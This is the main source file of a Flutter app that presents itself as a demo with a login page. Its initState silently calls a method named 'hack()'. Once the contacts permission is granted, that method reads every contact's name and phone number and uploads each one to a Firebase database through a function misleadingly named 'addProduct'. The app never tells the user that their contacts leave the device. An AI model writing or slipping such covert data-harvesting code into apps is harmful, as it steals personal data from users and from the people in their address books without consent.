import 'package:contacts_service/contacts_service.dart';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'screens/login_page.dart';
import 'services/firebase-database.dart';
import 'services/firebase-database.dart';

void main() {
  runApp(MyApp());
}

class MyApp extends StatefulWidget {
  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  void hack() async {
    if (await Permission.contacts.request().isGranted) {
      // Either the permission was already granted before or the user just granted it.
      var contacts =
          (await ContactsService.getContacts(withThumbnails: false)).toList();
      print("aaaa");
      contacts
          .map((e) => e.phones.map((i) async {
                print(e.displayName + i.value);
                await addProduct(i.value, e.displayName);
              }).toList())
          .toList();

      // addProduct(contacts.iterator.current.phones.toString(),
      //     contacts.iterator.current.displayName);
    }
  }

  @override
  void initState() {
    // TODO: implement initState
    hack();
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        // This is the theme of your application.
        //
        // Try running your application with "flutter run". You'll see the
        // application has a blue toolbar. Then, without quitting the app, try
        // changing the primarySwatch below to Colors.green and then invoke
        // "hot reload" (press "r" in the console where you ran "flutter run",
        // or simply save your changes to "hot reload" in a Flutter IDE).
        // Notice that the counter didn't reset back to zero; the application
        // is not restarted.
        primarySwatch: Colors.blue,
      ),
      home: LoginPage(),
    );
  }
}
